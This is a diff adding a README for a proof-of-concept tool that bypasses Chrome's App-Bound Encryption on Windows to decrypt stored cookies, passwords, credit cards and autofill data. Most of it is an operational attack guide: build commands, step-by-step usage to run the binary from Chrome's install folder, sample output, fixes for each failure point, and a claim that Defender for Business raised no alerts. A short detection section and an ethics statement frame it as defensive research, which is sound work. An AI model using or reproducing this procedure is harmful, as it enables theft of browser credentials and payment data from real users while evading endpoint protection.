@@ -1,2 +1,248 @@
 # chrome-abe-extract
-Proof-of-concept demonstrating a path-validation bypass in Chrome's App-Bound Encryption elevation service. Recovers the ABE master key via COM and decrypts cookies, passwords, and cards from a Chrome profile. For authorized lab use only.
+
+A proof-of-concept demonstrating a path-validation bypass in Chrome's App-Bound Encryption (ABE) elevation service on Windows.
+
+Extracts and decrypts cookies, passwords, credit cards, IBANs, and autofill data from a Chrome profile by recovering the ABE master key through Chrome's own COM interface.
+
+**For authorized security research and lab use only.**
+
+---
+
+## Background
+
+Chrome 127 introduced App-Bound Encryption to prevent infostealers from accessing browser data. The design wraps a profile-wide AES-256 master key in two layers of DPAPI encryption and gates decryption behind a SYSTEM-level elevation service. Before releasing the key, the service validates that the caller's executable resides in Chrome's install directory.
+
+That validation is directory-based, not identity-based. Any process running from `C:\Program Files\Google\Chrome\Application\` satisfies it, regardless of filename or code signature.
+
+This technique is documented in [CyberArk Labs' C4 research](https://www.cyberark.com/resources/threat-research-blog/c4-bomb-blowing-up-chromes-appbound-cookie-encryption) (June 2025). The CVE originally assigned to it (CVE-2025-34092) was later rejected by the NVD. The rejection does not change the underlying technical finding — the technique remains functional against Chrome builds with ABE enabled.
+
+---
+
+## What It Does
+
+1. Reads `app_bound_encrypted_key` from `Local State`
+2. Base64-decodes the value and strips the `APPB` header
+3. Calls `IElevator::DecryptData` via COM to recover the 32-byte master key
+4. Decrypts v20 blobs with AES-256-GCM via BCrypt
+5. Writes everything to `C:\testing\abe_dump.json`
+
+---
+
+## Supported Data
+
+| Type | Database | Table |
+|------|----------|-------|
+| Cookies | `Default\Network\Cookies` | `cookies` |
+| Passwords | `Default\Login Data` | `logins` |
+| Credit cards | `Default\Web Data` | `credit_cards` |
+| IBANs | `Default\Web Data` | `local_ibans` |
+| Autofill | `Default\Web Data` | `autofill` |
+
+---
+
+## Build
+
+**Prerequisites:** Visual Studio 2022 with the Desktop development with C++ workload, plus the SQLite amalgamation (`sqlite3.c` and `sqlite3.h` from [sqlite.org/download.html](https://www.sqlite.org/download.html)).
+
+Place `sqlite3.c` and `sqlite3.h` in `third_party/sqlite3/`.
+
+Open the **x64 Native Tools Command Prompt for VS 2022** and run:
+
+```cmd
+cl /nologo /EHsc /O2 /MT /W3 /D_UNICODE /DUNICODE ^
+   /I third_party/sqlite3 ^
+   src/chrome_abe_extract.cpp ^
+   third_party/sqlite3/sqlite3.c ^
+   /Fe:chrome_abe_extract.exe ^
+   /link /SUBSYSTEM:CONSOLE ^
+   ole32.lib oleaut32.lib bcrypt.lib shell32.lib advapi32.lib ^
+   shlwapi.lib crypt32.lib rpcrt4.lib
+```
+
+Warnings from `sqlite3.c` are expected — the amalgamation is not warning-clean under MSVC.
+
+---
+
+## Usage
+
+**Step 1 — Copy the executable into Chrome's install directory** (requires Administrator):
+
+```cmd
+copy chrome_abe_extract.exe "C:\Program Files\Google\Chrome\Application\"
+```
+
+**Step 2 — Close Chrome:**
+
+```cmd
+taskkill /F /IM chrome.exe /T
+```
+
+**Step 3 — Confirm the elevation service is running:**
+
+```cmd
+sc query "GoogleChromeElevationService"
+```
+
+If stopped:
+
+```cmd
+net start "GoogleChromeElevationService"
+```
+
+**Step 4 — Run from a NON-elevated command prompt:**
+
+```cmd
+"C:\Program Files\Google\Chrome\Application\chrome_abe_extract.exe"
+```
+
+Output: `C:\testing\abe_dump.json`
+
+---
+
+## Expected Output
+
+```
+==============================================
+  ChromeABE-Extract - Custom ABE Bypass Tool
+  Authorized lab use only
+==============================================
+
+[+] Already running from Chrome's directory.
+[*] User data: C:\Users\<user>\AppData\Local\Google\Chrome\User Data
+[+] Encrypted key: 64 bytes
+[+] IElevator2 instance created.
+[+] Proxy blanket set (IElevator2).
+[*] Stripped APPB header.
+[+] Master key decrypted: 32 bytes
+
+[*] Extracting data...
+[*] Cookies:    94 total, 94 decrypted
+[*] Passwords:  3 total, 3 decrypted
+[*] Cards:      1 total, 1 decrypted
+[*] IBANs:      0 total, 0 decrypted
+[*] Autofill:   12 total, 3 v20 decrypted
+[+] JSON written to: C:\testing\abe_dump.json
+
+[+] Done.
+    Cookies:   94
+    Passwords: 3
+    Cards:     1
+    IBANs:     0
+    Autofill:  12
+[*] Master key: <32-byte hex>
+```
+
+---
+
+## Common Errors
+
+| HRESULT | Meaning | Fix |
+|---------|---------|-----|
+| `0x8004a004` | Path validation rejected | Run from Chrome's install directory |
+| `0x8004a003` | Service unreachable, or wrong user context | Start the service; run as normal user (not elevated) |
+| `ERROR_ACCESS_DENIED` | Running elevated | Use a non-elevated prompt |
+
+### The Three Walls
+
+1. **`0x8004a004`** — ran from `C:\testing\`. The elevation service normalizes the caller's path and compares it against a value baked into the encrypted blob. `C:\testing\` does not match Chrome's install directory. Fixed by running from Chrome's directory. **The filename is irrelevant — only the directory matters.**
+
+2. **`0x8004a003`** — right directory, still failing. The RPC channel between the tool and the elevation service was unauthenticated. Fixed by calling `CoSetProxyBlanket` with `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`, `RPC_C_IMP_LEVEL_IMPERSONATE`, and `EOAC_DYNAMIC_CLOAKING`. Most custom PoCs stall here.
+
+3. **`ERROR_ACCESS_DENIED`** — running from an elevated prompt. DPAPI binds the master key to the user's logon token. An elevated token has a different context, so DPAPI refuses. Fixed by running as the normal user after copying the binary as Administrator.
+
+---
+
+## Testing
+
+Verified against Chrome 153 on Windows 11 with **Microsoft Defender for Business** enabled (cloud protection on, no exclusions).
+
+| Stage | Result |
+|-------|--------|
+| Copy to Chrome's install dir | Allowed |
+| First execution from Chrome's folder | Allowed |
+| `CoCreateInstance(CLSID_Elevator)` | Not detected |
+| Reads of `Local State` and DB files | Not detected |
+| End-to-end run | Completed |
+| Alert generated | None |
+| Detection latency | Never |
+
+Defender for Business produced zero alerts at any stage. The absence of behavioral telemetry for COM instantiation and browser profile access means this technique runs clean in environments where Defender for Business is the only endpoint control.
+
+**Caveat:** This says nothing about Defender for Endpoint (the enterprise SKU) or Defender XDR, which have different sensors and behavioral engines than the Business SKU. The result is specific to Defender for Business with default configuration.
+
+---
+
+## Detection
+
+Indicators defenders can look for:
+
+- Non-`chrome.exe` binaries in `C:\Program Files\Google\Chrome\Application\`
+- Any process outside Chrome instantiating the `IElevator` COM object
+- Reads of `Local State`, `Login Data`, and `Web Data` from the same unexpected process
+- Sysmon Event 1 for process creation in Chrome's install directory
+
+None of these alone is damning. Together, they are a clean signature.
+
+---
+
+## Limitations
+
+- Targets the `Default` profile only
+- Requires Administrator to write to Chrome's install directory (one-time copy)
+- Requires the elevation service to be running
+- Chrome must be closed before extracting from `Login Data` and `Web Data` (SQLite locks)
+- Cookie values in the JSON include a 32-byte SHA-256 prefix; the real value starts at byte 32
+
+---
+
+## Repository Structure
+
+```
+chrome-abe-extract/
+├── README.md
+├── LICENSE
+├── .gitignore
+├── src/
+│   └── chrome_abe_extract.cpp
+├── third_party/
+│   └── sqlite3/
+│       ├── sqlite3.c
+│       └── sqlite3.h
+└── screenshots/
+    ├── successful-run.png
+    ├── json-dump.png
+    └── defender-result.png
+```
+
+---
+
+## References
+
+- CyberArk Labs — C4 Bomb: Blowing Up Chrome's AppBound Cookie Encryption (June 2025) — https://www.cyberark.com/resources/threat-research-blog/c4-bomb-blowing-up-chromes-appbound-cookie-encryption
+- xaitax — ChromElevator (DLL injection variant) — https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
+- Gen Digital — VoidStealer analysis (debugger-based bypass) — https://www.gendigital.com/blog/insights/research/voidstealer-abe-bypass
+- Google Security Blog — Improving the security of Chrome cookies on Windows — https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
+
+---
+
+## Ethics
+
+This tool is published for defensive research, detection engineering, and security education.
+
+The technique itself is public. The purpose of this repository is to document the bypass so that detection engineers can build rules against it, security teams can assess whether their EDR catches it, and users understand why the ABE control, as implemented, is insufficient.
+
+Running this tool against systems you do not own is a criminal offense in most jurisdictions. The author does not condone, support, or assist with unauthorized use.
+
+---
+
+## License
+
+MIT — see [LICENSE](LICENSE).
+
+---
+
+## Author
+
+[Your Name] — [@yourhandle](https://twitter.com/yourhandle)
+
+If you build detection rules or improvements on top of this, open an issue or PR.
